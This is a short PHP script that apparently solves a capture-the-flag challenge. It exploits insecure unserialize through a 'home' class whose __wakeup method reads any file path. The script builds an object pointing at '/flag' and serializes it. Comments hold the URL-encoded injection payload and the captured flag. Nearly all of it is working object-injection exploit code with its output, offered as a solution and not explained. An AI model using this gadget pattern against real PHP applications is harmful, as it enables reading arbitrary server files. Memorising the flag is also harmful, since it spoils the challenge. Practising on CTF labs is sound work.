<?php

class home{
    private $args;
    function __construct($args){
        $this->args=$args;
    }
    function __wakeup()
    {
       echo  file_get_contents($this->args);
    }
}

$a = new home("/flag");
echo urlencode(serialize($a));
// a=O%3A4%3A%22home%22%3A1%3A%7Bs%3A10%3A%22%00home%00args%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D
// flag{cc8c0a97c2dfcd73caff160b65aa39e2}
?>